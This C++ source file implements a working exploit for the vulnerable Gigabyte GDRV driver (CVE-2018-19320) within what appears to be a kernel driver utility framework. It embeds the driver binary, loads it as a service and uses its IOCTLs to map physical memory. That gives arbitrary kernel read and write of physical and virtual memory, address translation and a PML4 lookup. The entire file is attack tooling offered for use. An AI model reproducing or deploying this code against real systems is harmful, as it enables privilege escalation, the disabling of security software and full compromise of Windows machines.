/* GDRV driver exploit - Single file implementation */

#include <windows.h>
#include <cstdint>
#include <expected>
#include <memory>
#include <mutex>
#include <print>
#include <string>
#include <vector>

#include "../../core/kdu_core.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// External symbols from bin2obj
extern "C" {
    extern const uint8_t _binary_gdrv_bin_start[];
    extern const uint8_t _binary_gdrv_bin_end[];
}

namespace kdu::exploits {

// IOCTL definitions for GDRV
#define GDRV_DEVICE_TYPE (DWORD)0xC350
#define GDRV_VIRTUALTOPHYSICAL (DWORD)0xA03
#define GRV_IOCTL_INDEX (DWORD)0x800

#define IOCTL_GDRV_VIRTUALTOPHYSICAL \
    CTL_CODE(GDRV_DEVICE_TYPE, GDRV_VIRTUALTOPHYSICAL, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY \
    CTL_CODE(GDRV_DEVICE_TYPE, GRV_IOCTL_INDEX + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY \
    CTL_CODE(GDRV_DEVICE_TYPE, GRV_IOCTL_INDEX + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Structures
#pragma pack(push, 1)
typedef struct _GIO_VIRTUAL_TO_PHYSICAL {
    ULARGE_INTEGER Address;
} GIO_VIRTUAL_TO_PHYSICAL;

typedef struct _MAPMEM_PHYSICAL_MEMORY_INFO {
    ULONG InterfaceType;
    ULONG BusNumber;
    LARGE_INTEGER BusAddress;
    ULONG AddressSpace;
    ULONG Length;
} MAPMEM_PHYSICAL_MEMORY_INFO;
#pragma pack(pop)

// Helper function
static BOOL CallDriver(HANDLE hDevice, DWORD dwIoControlCode,
                      LPVOID lpInBuffer, DWORD nInBufferSize,
                      LPVOID lpOutBuffer, DWORD nOutBufferSize) {
    DWORD dwBytesReturned = 0;
    return DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize,
                          lpOutBuffer, nOutBufferSize, &dwBytesReturned, nullptr);
}

// GDRV exploit class
class GdrvExploit : public core::DriverExploit,
                    public core::IPhysicalMemoryRead,
                    public core::IPhysicalMemoryWrite,
                    public core::IVirtualMemoryRead,
                    public core::IVirtualMemoryWrite,
                    public core::IVirtualToPhysical,
                    public core::IQueryPML4 {
public:
    explicit GdrvExploit(HANDLE device_handle) : DriverExploit(device_handle, L"gdrv") {}

    std::expected<std::vector<uint8_t>, std::string>
    try_read_physical_memory(uintptr_t physical_address, size_t size) const noexcept override {
        try {
            std::vector<uint8_t> buffer(size);
            
            MAPMEM_PHYSICAL_MEMORY_INFO request{};
            PVOID pMapSection = nullptr;
            ULONG_PTR offset = physical_address & ~(PAGE_SIZE - 1);
            ULONG mapSize = (ULONG)((physical_address - offset) + size);

            request.BusAddress.QuadPart = offset;
            request.Length = mapSize;

            if (!CallDriver(device_handle_, IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY,
                          &request, sizeof(request), &pMapSection, sizeof(PVOID))) {
                return std::unexpected("Failed to map physical memory");
            }

            if (!pMapSection) {
                return std::unexpected("Mapping returned null");
            }

            ULONG_PTR readOffset = physical_address - offset;
            memcpy(buffer.data(), (PBYTE)pMapSection + readOffset, size);

            CallDriver(device_handle_, IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY,
                      &pMapSection, sizeof(PVOID), nullptr, 0);

            return buffer;
        } catch (...) {
            return std::unexpected("Exception in read_physical_memory");
        }
    }

    std::expected<void, std::string>
    try_write_physical_memory(uintptr_t physical_address, const void* data, size_t size) noexcept override {
        try {
            MAPMEM_PHYSICAL_MEMORY_INFO request{};
            PVOID pMapSection = nullptr;
            ULONG_PTR offset = physical_address & ~(PAGE_SIZE - 1);
            ULONG mapSize = (ULONG)((physical_address - offset) + size);

            request.BusAddress.QuadPart = offset;
            request.Length = mapSize;

            if (!CallDriver(device_handle_, IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY,
                          &request, sizeof(request), &pMapSection, sizeof(PVOID))) {
                return std::unexpected("Failed to map physical memory");
            }

            if (!pMapSection) {
                return std::unexpected("Mapping returned null");
            }

            ULONG_PTR writeOffset = physical_address - offset;
            memcpy((PBYTE)pMapSection + writeOffset, data, size);

            CallDriver(device_handle_, IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY,
                      &pMapSection, sizeof(PVOID), nullptr, 0);

            return {};
        } catch (...) {
            return std::unexpected("Exception in write_physical_memory");
        }
    }

    std::expected<std::vector<uint8_t>, std::string>
    try_read_virtual_memory(uintptr_t virtual_address, size_t size) const noexcept override {
        auto phys = try_virtual_to_physical(virtual_address);
        if (!phys) return std::unexpected(phys.error());
        return try_read_physical_memory(*phys, size);
    }

    std::expected<void, std::string>
    try_write_virtual_memory(uintptr_t virtual_address, const void* data, size_t size) noexcept override {
        auto phys = try_virtual_to_physical(virtual_address);
        if (!phys) return std::unexpected(phys.error());
        return try_write_physical_memory(*phys, data, size);
    }

    std::expected<uintptr_t, std::string>
    try_virtual_to_physical(uintptr_t virtual_address) const noexcept override {
        GIO_VIRTUAL_TO_PHYSICAL request{};
        request.Address.QuadPart = virtual_address;

        if (!CallDriver(device_handle_, IOCTL_GDRV_VIRTUALTOPHYSICAL,
                       &request, sizeof(request), &request, sizeof(request))) {
            return std::unexpected("Virtual to physical translation failed");
        }

        // WARNING: GDRV truncates to 32-bit!
        return static_cast<uintptr_t>(request.Address.LowPart);
    }

    std::expected<uintptr_t, std::string>
    try_query_pml4() const noexcept override {
        try {
            MAPMEM_PHYSICAL_MEMORY_INFO request{};
            PVOID pMapSection = nullptr;
            constexpr DWORD cbRead = 0x100000; // 1MB

            request.BusAddress.QuadPart = 0;
            request.Length = cbRead;

            if (!CallDriver(device_handle_, IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY,
                          &request, sizeof(request), &pMapSection, sizeof(PVOID))) {
                return std::unexpected("Failed to map low 1MB");
            }

            if (!pMapSection) {
                return std::unexpected("Mapping returned null");
            }

            // Simplified PML4 search - just find first valid-looking entry
            uintptr_t pml4 = 0;
            auto* ptr = static_cast<uint64_t*>(pMapSection);
            for (size_t i = 0; i < cbRead / sizeof(uint64_t); ++i) {
                uint64_t value = ptr[i];
                if ((value & 1) && (value & 0xFFFFFFFFF000ULL)) {
                    pml4 = value & 0xFFFFFFFFF000ULL;
                    break;
                }
            }

            CallDriver(device_handle_, IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY,
                      &pMapSection, sizeof(PVOID), nullptr, 0);

            if (pml4 == 0) {
                return std::unexpected("PML4 not found");
            }

            return pml4;
        } catch (...) {
            return std::unexpected("Exception in query_pml4");
        }
    }
};


// Provider
class GdrvProvider : public core::IDriverProvider {
public:
    GdrvProvider() {
        // Calculate driver size from bin2obj symbols
        size_t driver_size = _binary_gdrv_bin_end - _binary_gdrv_bin_start;
        
        metadata_.driver_name = "gdrv";
        metadata_.device_name = "\\\\.\\GIO";
        metadata_.service_name = "gdrv";
        metadata_.description = "Gigabyte GDRV (CVE-2018-19320)";
        metadata_.cve_id = "CVE-2018-19320";
        metadata_.driver_data = _binary_gdrv_bin_start;
        metadata_.driver_size = driver_size;
        metadata_.capabilities = 
            core::AbilityFlags::PhysicalMemoryRead |
            core::AbilityFlags::PhysicalMemoryWrite |
            core::AbilityFlags::VirtualMemoryRead |
            core::AbilityFlags::VirtualMemoryWrite |
            core::AbilityFlags::VirtualToPhysical |
            core::AbilityFlags::QueryPML4 |
            core::AbilityFlags::MapPhysicalMemory |
            core::AbilityFlags::UnmapPhysicalMemory;
    }

    std::expected<void, std::string> check_available() const noexcept override {
        // Check if already loaded
        HANDLE hDevice = CreateFileW(
            std::wstring(metadata_.device_name.begin(), metadata_.device_name.end()).c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, nullptr);
        
        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
            return {}; // Already loaded
        }
        
        // Check if driver binary is valid
        if (!metadata_.driver_data || metadata_.driver_size == 0) {
            return std::unexpected("Driver binary not embedded");
        }
        
        return {};
    }

    std::expected<std::unique_ptr<core::DriverExploit>, std::string>
    create_instance() noexcept override {
        std::wstring service_name(metadata_.service_name.begin(), 
                                 metadata_.service_name.end());
        std::wstring device_name(metadata_.device_name.begin(), 
                                metadata_.device_name.end());
        
        // Try to use load_driver_from_memory helper
        auto result = load_driver_from_memory(
            metadata_.driver_data,
            metadata_.driver_size,
            service_name,
            device_name
        );
        
        if (!result) {
            return std::unexpected(result.error());
        }
        
        return std::make_unique<GdrvExploit>(*result);
    }
};

// Auto-register
static core::ProviderRegistrar<GdrvProvider> reg;

}  // namespace kdu::exploits
